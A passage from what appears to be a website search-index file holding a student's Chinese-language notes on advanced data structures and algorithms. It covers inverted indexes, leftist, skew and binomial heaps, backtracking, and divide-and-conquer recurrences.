D</code>\u200b\u4e4b\u4e2d\uff0c\u56e0\u4e3a\u8fd9\u4e2aterm\u96be\u4ee5\u754c\u5b9a\uff0c\u4f8b\u5982\u4e2d\u6587\u4e4b\u4e2d\uff0c\u5f20\u4e09\u8fd9\u4e2a\u8bcd\uff0c\u7a76\u7adf\u662f\u4ee5\u201c\u5f20\u4e09\u201d\u88ab\u6536\u5f55\u8fd8\u662f1\u4ee5\u201c\u5f20\u201d\uff0c\u201c\u4e09\u201d\u88ab\u6536\u5f55\uff1f\u5373\u4fbf\u5728\u82f1\u6587\u4e4b\u4e2d\uff0c\u4e5f\u6709artificial intelligenece\u8fd9\u79cd\u8fde\u8d2f\u7684\u8bcd\u7ec4</p> <p>\u96be\u70b9\u4e8c\u5728\u4e8e<code>Find(Dictionary, T)</code>\u200b\u4e0a\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u5efa\u7acb\u6709\u6548\u7684\u7d22\u5f15\u673a\u5236</p> <p>\u4e0a\u8ff0\u96be\u70b9\u4f7f\u5f97search enigne\u4ea7\u751f\u4e86\u8bb8\u591a\u7684modules</p> <p>token analyzer plus the stop filter</p> <p>\u5f53\u6211\u4eec\u5728\u8bfb\u5165term\u7684\u65f6\u5019\uff0c\u6211\u4eec\u6709\u4ee5\u4e0b\u5de5\u4f5c\u8981\u505a</p> <ul> <li>word  stemming  \u4e5f\u5c31\u662f\u8ba9\u5355\u8bcd\u53d8\u6210\u539f\u578b said -&gt; say</li> <li>stop words  \u5bf9\u4e8e\u8fc7\u5206\u7684\u5e38\u89c1\u8bcd\u2018a' 'it'\u7b49\u6211\u4eec\u5728\u7b2c\u4e00\u6b21\u9047\u5230\u5b83\u4eec\u65f6\u5c31\u5728\u5168\u6587\u672c\u4e2d\u6d88\u9664\u5b83\u4eec\uff0c\u4f46\u6211\u4eec\u4ecd\u7136\u4f1a\u8bb0\u5f55\u5b83\u4eec\uff0c\u4f46\u662f\u4e0d\u662f\u8bf4\u4efb\u4f55\u7f51\u9875\u4e2d  \u2018a\u2019\u90fd\u662fstop words \u6bd4\u5982\u5b57\u5178\u7f51\u7ad9\u91cc\u9762\u89e3\u91ca'a'\u7684\u7528\u6cd5</li> </ul> <p>accessing the terms</p> <p>\u5bf9\u4e8e\u7d22\u5f15\u800c\u8a00\uff0c\u89e3\u51b3\u65b9\u6cd5\u6709\u5f88\u591a</p> <p>\u7b2c\u4e00\u79cd\u662fsearch tree \u4e00\u822c\u4fe9\u8bf4\u5c31\u662fB tree\u5bb6\u65cf\uff0c\u4ee5\u53caTries tree\uff08\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5904\u7406\u82f1\u6587\u5355\u8bcd\u7684\u6811</p> <p>\u7b2c\u4e8c\u79cd\u662fhash\uff0c\u826f\u597d\u7684hash\u51fd\u6570\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5728\u5e38\u6570\u65f6\u95f4\u5185\u505a\u7d22\u5f15</p> <p>\u76f8\u6bd4\u4e8eB\u6811\u5bb6\u65cf\uff0chash\u66f4\u52a0\u64c5\u957f\u7d22\u5f15single word\uff0c\u4f46\u662f\u5728\u8303\u56f4\u7d22\u5f15\u4e0a\u8868\u73b0\u4e0d\u4f73\uff0chash table\u6ca1\u6cd5\u505a\u987a\u5e8f\u626b\u63cf</p> <p>\u4f8b\u5982\u6211\u4eec\u8f93\u5165\u4e86\u9519\u8bef\u7684\u8bcd\u8bed\uff0c\u5982\u679c\u7528B\u6811\u7684\u8bdd\uff0c\u4e0e\u5176\u76f8\u8fd1\u7684term\u5728\u7269\u7406\u4f4d\u7f6e\u4e0a\u5c31\u5728\u9644\u8fd1\uff0c\u56e0\u6b64\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u80fd\u7ed9\u51fa\u90a3\u4e9b\u201c\u53ef\u80fd\u662f\u4f60\u9700\u8981\u7684\u5185\u5bb9\u201d</p> <p>memory management</p> <p>\u5bf9\u4e8e\u641c\u7d22\u5f15\u64ce\u800c\u8a00\uff0c\u8fd8\u6709\u9690\u85cf\u7684\u56f0\u96be\u5728\u4e8ememory\u7684\u7ba1\u7406\uff0c\u56e0\u4e3a\u5927\u91cf\u7684\u6587\u672c\u662f\u65e0\u6cd5\u90fd\u5b58\u5728\u5185\u5b58\u91cc\u7684</p> <p>\u200b\u200b</p> <p>problem\uff1f</p>"},{"location":"ZJU-course/ADS/ADS/#some-topics","title":"some topics","text":"<p>distributed index</p> <p>\u4e3b\u8981\u9488\u5bf9\u4e0e\u6570\u636e\u91cf\u8fc7\u4e8e\u5e9e\u5927\uff0c\u5bfc\u81f4\u5176\u9700\u8981\u5b58\u50a8\u5728\u591a\u4e2a\u673a\u5668\u4e0a\u7684\u60c5\u5f62</p> <p>\u6211\u4eec\u9700\u8981\u4e00\u4e2acluster\u7684machine\u53bb\u5904\u7406\u4ed6\uff0c\u6bcf\u4e2amachine\u662fcluster\u4e0a\u7684\u4e00\u4e2anode\uff0c\u5f88\u76f4\u63a5\u5730\uff0c\u6211\u4eec\u4f1a\u8003\u8651\u8ba9\u6bcf\u4e00\u4e2anode\u5b58\u50a8collection\u7684\u4e00\u4e2a\u5b50\u96c6\u5408</p> <ul> <li>term-partitioned index    \u53ea\u5efa\u7acb\u90e8\u5206\u7684\u8bcd\u7684\u6240\u6709\u7d22\u5f15</li> <li>document-partitioned index  \u53ea\u5efa\u7acb\u6240\u6709\u7684\u8bcd\u5bf9\u4e8e\u90e8\u5206\u6587\u672c\u7684\u7d22\u5f15</li> </ul> <p>\u5728\u5b9e\u9645\u7684\u5e94\u7528\u4e2d\uff0c\u8fd9\u4e24\u79cd\u60c5\u5f62\u5f80\u5f80\u7ec4\u5408\u8d77\u6765\u4f7f\u7528</p> <p>dynamic indexing</p> <p>\u6211\u4eec\u5efa\u7acb\u4e00\u4e2amain index\u548c\u4e00\u4e2aauxiliary index\uff0c\u5148\u628a\u65b0\u7684documents\u653e\u5230auxiliary index\u4e2d\uff0c\u518d\u5728\u5fc5\u8981\u7684\u65f6\u5019\u5c06\u5176\u5408\u5e76\u5230main index\u4e2d</p> <p>\u5b58\u5728\u4e00\u4e9b\u95ee\u9898 \u5982\u4f55\u5220\u9664\uff0c\u4ec0\u4e48\u65f6\u5019re-index</p> <p>compress</p> <ul> <li>delete stop words</li> <li>\u540c\u65f6\u53ef\u4ee5\u628a\u7ed3\u679c\u7f16\u7801\u4e3a\u4e24\u6570\u4e4b\u5dee\uff0c\u907f\u514d\u8fc7\u5927\u7684index\u5b58\u50a8</li> </ul> <p>thresholding \u9608\u503c</p> <p>\u5bf9\u4e8edocument\u800c\u8a00\uff0c\u6211\u4eec\u53ea\u68c0\u7d22\u524dx\u4e2adocuments\uff0c\u8fd9\u4e9bdocs\u6309\u7167\u6743\u91cd\u6392\u5e8f\uff0c\u8fd9\u4e2ax\u662f\u4e00\u4e2athresholding</p> <p>\u4f46\u8fd9\u4f1a\u6709\u4e00\u4e9b\u95ee\u9898\uff0c\u4f8b\u5982</p> <ul> <li>\u5bf9\u4e8e boolean \u67e5\u8be2\u4f1a\u4ea7\u751f\u95ee\u9898\uff0c\u4f8b\u5982\u540c\u65f6\u67e5\u8be2 'computer' &amp; 'science'</li> <li>\u4f1a\u9519\u8fc7\u4e00\u4e9b\u76f8\u5173docs</li> </ul> <p>\u5bf9\u4e8equery\u800c\u8a00\uff0c\u5f53\u6211\u4eec\u6709\u5927\u91cfterm\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f1a\u5bf9terms\u8fdb\u884c\u4e00\u4e2a\u6392\u5e8f\uff0c\u5bf9\u4e8e\u5176\u51fa\u73b0\u7684\u9891\u7387\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\uff08\u56e0\u6b64\u4f1a\u5148\u68c0\u7d22\u51fa\u73b0\u9891\u7387\u5c11\u7684term\uff09\uff0c\u53ea\u68c0\u7d22\u4e00\u5b9a\u7a0b\u5ea6\u4ee5\u4e0a\u7684terms</p>"},{"location":"ZJU-course/ADS/ADS/#measures-for-search-engine","title":"measures for search engine","text":"<p>\u8fd9\u90e8\u5206\u4e3b\u8981\u662f\u8bb2\u8ff0\u4e86\u8bc4\u4ef7\u641c\u7d22\u5f15\u64ce\u7684\u4e00\u7cfb\u5217\u6307\u6807</p> <ul> <li>index \u7684\u901f\u5ea6</li> <li>search \u7684\u901f\u5ea6</li> <li>expressiveness of query language   \u80fd\u591f\u5e94\u5bf9\u590d\u6742\u7684\u7d22\u5f15\u9700\u6c42</li> </ul> <p>user happiness</p> <p>\u200b\u200b</p> <p>relevance measurement</p> <ul> <li>a benchmark document collection</li> <li>a benchmark suite of queries</li> <li>a binary assessment of either relevant and irrelevant for each query-doc pair</li> </ul> <p>precision \u641c\u51fa\u6765\u7684\u4e1c\u897f\u91cc\u9762\u767e\u5206\u4e4b\u591a\u5c11\u662f\u9700\u8981\u7684</p> <p>recall \u60f3\u8981\u7684\u6b63\u786e\u7b54\u6848\u6709\u591a\u5c11\u88ab\u641c\u7d22\u51fa\u6765\u4e86</p>"},{"location":"ZJU-course/ADS/ADS/#leftist-heap","title":"Leftist heap","text":""},{"location":"ZJU-course/ADS/ADS/#basic-features","title":"basic features","text":"<p>heap\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u7ed3\u6784\uff0cleftist heap\u5bf9\u4e8e\u5176\u5408\u5e76\u64cd\u4f5c\u505a\u4e86\u4f18\u5316\uff0c\u4e5f\u5c31\u662f\u8bf4\u8981\u5408\u5e76\u4e24\u4e2aheap</p> <p>\u666e\u901a\u7684heap\u6709\u4ee5\u4e0b\u6027\u8d28\uff08\u4ee5\u5c0f\u9876\u5806\u4e3a\u4f8b\uff09</p> <ul> <li>\u662f\u4e00\u9897\u5b8c\u5168\u4e8c\u53c9\u6811</li> <li>\u8282\u70b9\u5c0f\u4e8e\u81ea\u8eab\u7684\u5b50\u8282\u70b9</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u6570\u7ec4\u5c06\u5176\u6784\u5efa\u4e3a\u4e00\u4e2aheap\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(N) \u4e5f\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\u5408\u5e76\u4e24\u4e2a\u5806\u7684\u6548\u7387</p> <p>\u800c\u5728leftist heap\u4e2d\uff0c\u6211\u4eec\u91c7\u7528\u6307\u9488\u7684\u5f62\u5f0f\u6784\u5efa\u4e8c\u53c9\u6811\uff0c\u867d\u7136\u6307\u9488\u5728\u5355\u6b21\u64cd\u4f5c\u4e2d\u6548\u7387\u8fdc\u4e0d\u5982\u6570\u7ec4\u597d\uff0c\u4f46\u662f\u5728leftist heap\u6211\u4eec\u5f97\u4ee5\u6253\u7834O\uff08N)\u7684\u590d\u6742\u5ea6\uff0c\u5728\u6027\u8d28\u4e0a\uff0cleftist heap</p> <ul> <li>\u8282\u70b9\u4ecd\u7136\u5c0f\u4e8e\u81ea\u8eab\u5b50\u8282\u70b9</li> <li>\u662f\u4e8c\u53c9\u6811\uff0c\u4f46\u4e0d\u5e73\u8861</li> </ul> <p>\u5728leftist heap\u4e2d\u6211\u4eec\u5b9a\u4e49 null path length (NPL) \u6307\u7684\u662fnode X\u5230\u6ca1\u6709\u4e24\u4e2a\u5b69\u5b50\u7684node\u7684\u6700\u77ed\u8def\u5f84\uff0c\u7279\u522b\u7684 NPL(NULL) = -1</p> <p>\u6211\u4eec\u81ea\u5e95\u5411\u4e0a\u8bb0\u5f55NPL NPL(x) = min{NPL(c) + 1 \u5176\u4e2dc\u662fx\u7684\u6240\u6709children}</p> <p>leftist heap\u7684\u7279\u6b8a\u6027\u8d28\u5728\u4e8e\uff0c</p> <ul> <li>\u5de6\u5b69\u5b50\u7684NPL &gt;= \u53f3\u5b69\u5b50\u7684NPL</li> </ul> <p>\u8be5\u6027\u8d28\u662f\u7684leftist heap \u5b58\u5728\u4e00\u4e9b\u7279\u6027\uff0c\u4f8b\u5982</p> <ul> <li>\u5176right path\u4e3ar nodes\u7684\u60c5\u51b5\u4e0b\uff0cleftist tree\u81f3\u5c11\u67092<sup>r</sup> - 1\u4e2anodes</li> <li>how long is the right path of a leftist heap of N nodes -&gt; O(logN)</li> </ul> <p>right path\u7684\u77ed\u5c0f\u51b3\u5b9a\u4e86\u6211\u4eec\u5728right path\u5f00\u5c55\u7684\u5de5\u4f5c\u90fd\u662f\u975e\u5e38\u8fc5\u901f\u7684</p> <p>\u5bf9\u4e8eleftist heap\u800c\u8a00\uff0c\u63d2\u5165\u662f\u5408\u5e76\u7684\u7279\u6b8a\u60c5\u51b5</p>"},{"location":"ZJU-course/ADS/ADS/#merge","title":"merge","text":"<p>\u5bf9\u4e8emerge\u64cd\u4f5c\u6211\u4eec\u8bb2\u8ff0\u4e86\u4e24\u79cd\u7248\u672c\uff0c\u4e00\u79cd\u662f\u9012\u5f52\u7684\uff0c\u4e00\u79cd\u662f\u5faa\u73af\u7684 \uff08\u4ee5\u4e0b\u53d9\u8ff0\u5747\u4ee5\u5c0f\u6839\u5806\u4e3a\u4f8b</p> <p>\u9012\u5f52</p> <p>\u5408\u5e76\u4e24\u4e2a\u6811\uff0c\u9009\u62e9\u6839\u8282\u70b9\u66f4\u5c0f\u7684\u90a3\u4e2a\uff0c\u5c06\u5176\u53f3\u5b50\u6811\u548c\u53e6\u4e00\u9897\u6811\u7ed3\u5408\uff08\u6b64\u5904\u7ed3\u5408\u53d1\u751f\u9012\u5f52\uff09\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6211\u4eec\u540c\u65f6\u9700\u8981\u901a\u8fc7\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\u6765\u7ef4\u62a4\u6027\u8d28</p> <p>\u5220\u9664</p> <p>\u5bf9\u4e8e\u5de6\u503e\u5806\u7684\u5220\u9664\uff08deleteMin\uff09\uff0c\u6211\u4eec\u53ea\u9700\u5220\u9664\u6389root\uff0c\u7136\u540emerge\u4ea7\u751f\u7684\u4e24\u4e2a\u5b50\u6811\u5373\u53ef</p>"},{"location":"ZJU-course/ADS/ADS/#skew-heap","title":"skew heap","text":"<p>\u5c31\u50cfsplay tree\u548cAVL tree\u7684\u533a\u522b\u4e00\u6837\uff0cskew heap\u662f\u4e00\u79cd\u5728\u884c\u4e3a\u4e0a\u66f4\u7b80\u5355\u7684heap</p> <p>\u5bf9\u4e8eskew heap\u6765\u8bf4\uff0c\u5b83\u65e0\u6761\u4ef6\u5730\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\uff0c\u65e0\u9700care NPL</p> <p>\u6bcf\u4e00\u6b21\u90fd\u627e\u5230\u4e24\u9897\u6811\u4e2d\u5c0froot\u7684\u90a3\u4e2a\uff0c\u4ea4\u6362\u5176\u5de6\u53f3\u5b50\u6811\uff0c\u5c06\u5176\u5de6\u5b50\u6811\u548c\u53e6\u4e00\u9897\u6811\u8fdb\u884cmerge\uff0c\u5f62\u6210\u9012\u5f52</p> <p>\u7c7b\u4f3c\u4e8elefist heap\u4e00\u6837\u5b8c\u6210\u63d2\u5165\uff0c\u4f46\u662f\u4e0d\u505a\u4ea4\u6362\uff0c\u6700\u540e\u5b8c\u6210\u63d2\u5165\u4e4b\u540e\u518d\u4ece\u5e95\u90e8\u9012\u5f52\u5730\u8c03\u6362\u4e0a\u6765</p>"},{"location":"ZJU-course/ADS/ADS/#amortized-analysis-of-skew-heap","title":"amortized analysis of skew heap","text":"<p>\u5c06\u6240\u6709\u8fdd\u53cd\u5de6\u503e\u8981\u6c42\u7684node\u8bb0\u4e3aheavy node\uff0c\u5206\u6790merge\u524d\u540e\u4e24\u8005\u7684\u533a\u522b</p>"},{"location":"ZJU-course/ADS/ADS/#binomial-queue","title":"Binomial queue","text":"<p>Binomial queue\u7684\u91cd\u5fc3\u4e5f\u662fmerge\u7684\u6548\u7387</p> <p>binomial queue\u4e0d\u662f\u4e00\u4e2aheap\uff0c\u800c\u662f\u4e00\u4e9bheap-ordered trees\u7684\u96c6\u5408\uff0c\u6bcf\u4e00\u4e2aheap-orddered tree\u90fd\u662f\u4e00\u4e2abinomial tree</p> <p>binomial tree\u7684\u5b9a\u4e49</p> <ul> <li>\u5355\u4e2a\u8282\u70b9\u7684tree\u88ab\u79f0\u4e3aheight 0 \u7684 binomial tree</li> <li>\u5bf9\u4e8e\u4e00\u4e2abinomial tree Bk\uff0c\u5176\u5fc5\u987b\u662f\u4e00\u4e2abinomial tree Bk-1 \u8fde\u63a5\u5230\u53e6\u4e00\u4e2aBk-1\u7684root\u4e0a</li> </ul> <p>\u200b\u200b</p> <p>\u884d\u751f\u51fa\u4e86\u4e00\u7cfb\u5217\u7684features\uff0c\u4f8b\u5982\u5728\u6df1\u5ea6d\u4e0a\u7684node\u6570\u91cf\u662f</p> <p>binomial queue\u548c\u4e8c\u8fdb\u5236\u53ef\u4ee5\u5f62\u6210\u5bf9\u5e94\u5173\u7cfb</p> <p>binomial queue\u7684\u64cd\u4f5c</p> <ul> <li>FindMin  \u904d\u5386\u5e8f\u5217\uff0c\u6700\u5c0f\u7684\u4e00\u5b9a\u662froot\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662froot\u7684\u6570\u91cf\uff0c\u5bf9\u4e8e\u6709n\u4e2anode\u7684binomial queue\u6765\u8bf4\uff0c\u662flogN</li> </ul> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u91c7\u53d6\u7528\u4e00\u4e2avariable\u53bb\u8868\u793a\u6700\u5c0f\u503c\uff0c\u5e76\u4e14\u5b9e\u65f6\u66f4\u65b0\u5b83\uff0c\u4f7f\u5176\u8f6c\u6362\u6210O1\uff0c\u4f46\u662f\u610f\u4e49\u4e0d\u5927\uff0c\u56e0\u4e3adelete\u4e4b\u540e\u8fd8\u5f97\u91cd\u65b0\u627e\uff0c\u8fd8\u662flogN * merge \u5408\u5e76\u4e24\u4e2aqueue\uff0c\u60f3\u8c61\u4e24\u4e2a\u4e8c\u8fdb\u5236\u6570\u7684\u52a0\u6cd5   \u200b </p> <p>\u5176\u64cd\u4f5c\u590d\u6742\u5ea6\u662fO(logN)  \u662f\u628aH2merge\u5230H1\uff0c\u4ee5H1\u4e3a\u6700\u540e\u7684\u7ed3\u679c * insert \u662fmerge\u7684\u7279\u6b8a\u60c5\u51b5\uff0c\u6ce8\u610f\u5408\u5e76\u548c\u8fdb\u4f4d\uff0cinsert\u7684\u5e73\u5747\u65f6\u95f4\u662fconstant\u7684 * deleteMin \u9700\u8981\u505a\u62c6\u5206\u5148find min\u627e\u5230\u5177\u4f53\u90a3\u9897\u6811\uff0c\u5e76\u4e14\u5c06\u8fd9\u8bfe\u6570\u79fb\u9664\u539f\u672c\u7684H1\uff0c\u540e\u6765\u6211\u4eec\u628a\u5206\u79bb\u51fa\u6765\u7684\u6811deletemin\u5f97\u5230\u4e00\u4e2a\u68ee\u6797H2\uff0c\u7136\u540e\u6211\u4eec\u505a\u5408\u5e76\uff0c\u603b\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662fOlogN</p> <p>operation\u7684implementation</p> <p>\u5bf9\u4e8edeleteMin \u603b\u7684queue\u4f7f\u7528first-child next-sibling representation\u7684\u65b9\u5f0f\u6765\u7ec4\u7ec7\u8fd9\u4e9bsubtree</p> <p>\u5bf9\u4e8eMerge\uff0c\u9700\u8981\u8ba9queue\u6309\u7167decrease size\u7684\u65b9\u5f0f\u7ec4\u7ec7\u7684subtrees</p> <p>\u200b\u200b</p> <p>\u5355\u4e2abin tree\u7684\u5408\u5e76\u662f\u7b80\u5355\uff0c\u4f46\u662f\u6574\u4e2aqueue\u7684merge\u662f\u590d\u6742\u7684</p> <pre><code>int * p = nullptr;\n!!p is 0\nint * p = &amp; n;\n!!p is 1\n</code></pre> <p>\u8fd9\u662f\u4e00\u79cd\u5224\u65adp\u662f\u5426\u4e3a\u7a7a\u6307\u9488\u7684\u65b9\u6cd5</p> <p>analysis</p> <p>\u5173\u4e8e\u63d2\u5165\uff0c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u662fOlogN\uff0c\u4f46\u662f\u644a\u8fd8\u65f6\u95f4\u590d\u6742\u5ea6\u662fO1\uff0c\u4efb\u610fN\u4e2a\u5143\u7d20\u7684\u63d2\u5165\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662fON</p> <p>\u6700\u5927\u4f18\u52bf\u5728\u4e8e\u644a\u8fd8\u7684\u5efa\u5806\u64cd\u4f5c\u662fON</p> <p>binary heap\u5efa\u5806\u4e5f\u662fON \uff08\u81ea\u5e95\u5411\u4e0a\uff09 \u4e00\u4e2a\u4e2a\u63d2\u5165\u662fONlogN</p>"},{"location":"ZJU-course/ADS/ADS/#backtracking","title":"Backtracking","text":"<p>\u56de\u6eaf\u8fd8\u662f\u679a\u4e3e\uff0c\u4f46\u662f\u4e0d\u662f\u6240\u6709\u95ee\u9898\u90fd\u53ef\u679a\u4e3e\uff0c\u6bd4\u5982\u5b9e\u6570\u5b58\u5728</p> <p>\u8fd8\u6709\u4e00\u79cd\u548c\u56de\u6eaf\u8054\u7cfb\u7d27\u5bc6\u7684\u65b9\u6cd5\u53eb\u505a\u5206\u652f\u9650\u754c\uff0c\u662f\u5bbd\u5ea6\u4f18\u5148\u7684\u526a\u679d\uff0c\u800c\u56de\u6eaf\u662f\u6df1\u5ea6\u4f18\u5148\u7684\u526a\u679d</p> <p>\u56de\u6eaf\u96be\u4ee5\u5206\u6790\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>A sure-fire way to find the answer to a problem is to make a list of all candidate answers</p> <p>\u56de\u6eaf\u5e38\u7528\u4e8e\u5e7f\u641c\u548c\u6df1\u641c\uff0c\u672c\u8d28\u5728\u4e8e\u8d70\u56de\u5934\u8def</p> <p>\u56de\u6eaf\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u6d88\u9664\u90a3\u4e9b\u663e\u7136\u7684\u9519\u8bef\u7684\u6d4b\u8bd5\u60c5\u5f62\uff0c\u4e5f\u5c31\u662f\u526a\u679dpruning\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e9b\u4f8b\u5b50\u6765\u5b66\u4e60\u56de\u6eaf\u7b97\u6cd5</p>"},{"location":"ZJU-course/ADS/ADS/#eight-queens","title":"Eight Queens","text":"<p>\u627e\u5230\u4e00\u4e9b\u7ad9\u4f4d\uff0c\u57288x8\u7684\u68cb\u76d8\u4e0a\uff0c\u653e\u7f6e\u516b\u4e2a\u7687\u540e\u68cb\u5b50\uff0c\u4f7f\u5176\u4e0d\u4f1a\u76f8\u4e92\u5904\u4e8e\u653b\u51fb\u8303\u56f4</p> <p>\u5c06\u68cb\u76d8\u89c6\u4e3a\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u7136\u540e</p> <ul> <li>Q_i \u662f queen\u5728\u7b2ci\u4e2arow\u884c\uff0c\u56e0\u4e3a8x8\u7684\u68cb\u76d8\u653e8\u4e2a\uff0c\u5fc5\u7136\u6bcf\u4e2arow\u653e\u4e00\u4e2aqueen</li> <li>x_i \u662f Q_i \u5728\u7684 column index \u5217\u6570</li> </ul> <p>\u4e00\u4e2a\u89e3\u5c31\u662f\u4e00\u4e2a\u6570\u5217 x_1 - x_8</p> <p>\u6211\u4eec\u4ee5\u4e00\u4e2a4\u7687\u540e\u95ee\u9898\u4e3a\u4f8b\uff0c\u6784\u5efa\u51fa\u4e00\u9897\u6811\u8868\u793a\u5176\u6240\u6709\u60c5\u51b5</p> <p>\u200b\u200b</p> <p>\u7136\u540e\u5bf9\u8fd9\u9897\u6811\u505a\u6df1\u5ea6\u4f18\u5148\u641c\u7d22</p> <p>\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5b9e\u9645\u7684\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u9897\u6811\u662f\u5e76\u4e0d\u4f1a\u88ab\u5b9e\u9645\u6784\u9020\u51fa\u6765\u7684\uff0c\u5426\u5219\u5c31\u76f8\u5f53\u4e8e\u6d6a\u8d39\u4e86\u56de\u6eaf\u7684\u610f\u4e49</p>"},{"location":"ZJU-course/ADS/ADS/#the-turnpike-reconstruction-problem","title":"The Turnpike Reconstruction Problem","text":"<p>\u5728\u4e00\u6761\u76f4\u7ebf\u7684\u516c\u8def\u4e0a\uff0c\u6709N\u4e2a\u6536\u8d39\u7ad9\u4ece\u8fd1\u5230\u8fdc\uff08x1-xN\uff09\uff0c\u73b0\u5728\u7ed9\u51fa\u4efb\u610f\u4e24\u4e2a\u6536\u8d39\u7ad9\u4e4b\u95f4\u7684\u8ddd\u79bb\u7684\u53ef\u91cd\u590d\u96c6\u5408\uff08N(N-1)/2\uff09\u4e2a\u5143\u7d20\uff0c\u6c42\u6536\u8d39\u7ad9\u7684\u4f4d\u7f6e\uff0cx1 = 0</p> <p>\u9996\u5148\u901a\u8fc7\u8fd9\u4e2adistance\u96c6\u5408\u91cc\u7684\u6700\u5927\u503c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9axN\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u901a\u8fc7\u6b21\u5927\u503c\u6211\u4eec\u6709\u5bf9x2\u548cxN-1\u6709\u4e24\u79cd\u731c\u6d4b\uff0c\u6bcf\u6b21\u90fd\u8003\u8651\u4e0b\u4e00\u4e2a\u6700\u5927\u7684\u503c</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#tic-tac-toe-game","title":"tic-tac-toe game","text":"<p>min level\u9012\u51cf\u6216\u8005max level\u9012\u589e\u7684\u65f6\u5019\uff0c\u5c31\u53ef\u4ee5\u526a\u679d\u4e86</p>"},{"location":"ZJU-course/ADS/ADS/#divide-and-conquer","title":"Divide and conquer","text":"<p>\u5206\u6cbb\u95ee\u9898\u5f80\u5f80\u548c\u9012\u5f52\u7ed3\u5408\u7d27\u5bc6\uff0c</p> <ul> <li>divide\u5c31\u662f\u628a\u95ee\u9898\u5206\u6210\u4e00\u4e2a\u4e2a\u5b50\u95ee\u9898</li> <li>conquer\u5c31\u662f\u9012\u5f52\u7684\u89e3\u51b3\u8fd9\u4e9b\u5b50\u95ee\u9898</li> <li>Combine\u5c31\u662f\u628a\u5b50\u95ee\u9898\u7684\u89e3\u5408\u5e76\u6210\u539f\u95ee\u9898\u7684\u89e3</li> </ul>"},{"location":"ZJU-course/ADS/ADS/#closet-points-problem","title":"Closet Points Problem","text":"<p>\u7ed9\u51faN\u4e2a\u70b9\uff0c\u627e\u5230\u91cc\u9762\u8ddd\u79bb\u6700\u8fd1\u7684\u4e00\u5bf9\u70b9</p> <p>\u6211\u4eec\u91c7\u7528\u66b4\u529b\u7684\u65b9\u6cd5\u5c31\u662f\u904d\u5386N(N-1) / 2\u79cd\u53ef\u80fd\uff0c\u4f46\u662f\u91c7\u7528\u5206\u6cbb\uff0c\u5c06\u95ee\u9898\u8f6c\u6362\u6210\uff0c\u5de6\u8fb9\uff0c\u53f3\u8fb9\u548c\u8de8\u8fc7\u4e2d\u95f4\u5206\u5272\u7ebf\u4e09\u4e2a\u4e2d\u7684\u6700\u5c0f\uff0c\u53ef\u4ee5\u964d\u4f4e\u590d\u6742\u5ea6</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u5148\u6c42\u5de6\u53f3\u4e24\u8fb9\u5404\u81ea\u7684\u6700\u77ed\u8ddd\u79bb\uff0c\u5047\u8bbemin(left, right) = \\(\\delta\\) , \u5728\u6c42\u8de8\u4e2d\u95f4\u7ebf\u7684\u6700\u5c0f\u503c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u4f18\u5316</p> <p>\u200b\u200b</p> <p>\u53ea\u9700\u6c42\u7eff\u8272\u7ebf\u4ee5\u5185\u7684\u70b9\u5373\u53ef\uff0c\u5e76\u4e14\u4e0d\u4ec5\u4ec5\u662f\u518d\u6a2a\u5411\u7684\uff0c\u6211\u4eec\u5728\u7eb5\u5411\u8303\u56f4\u5185\uff0c\u4e5f\u53ef\u4ee5\u7528\\(\\delta\\)\u53bb\u89c4\u8303\uff0c\u5bf9\u4e8e\u5de6\u4fa7\u7684\u4e00\u4e2a\u70b9\uff0c\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\\(\\delta \\times 2\\delta\\)\u7684\u65b9\u6846\uff0c\u4f46\u662f\u6ce8\u610f\u5230\u5de6\u4fa7\u548c\u53f3\u4fa7\u5404\u81ea\u7684\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u90fd\u662f\u8981\u5927\u4e8e\\(\\delta\\)\u7684\uff0c\u56e0\u6b64\u8fd9\u4e2a\u6846\u80fd\u5708\u4f4f\u7684\u53f3\u4fa7\u70b9\u662f\u6709\u9650\u7684\u3002</p>"},{"location":"ZJU-course/ADS/ADS/#three-method-for-solving-recurrences","title":"Three method for solving recurrences","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5e38\u89c4\u7684\u5206\u6cbb\u6cd5\uff0c\u6211\u4eec\u6709</p> \\[ T\\left (  N\\right ) = a \\ T\\left ( N/b \\right ) + f\\left ( N \\right ) \\] <p>\u6211\u4eec\u5f80\u5f80\u5e76\u4e0dcare N/b 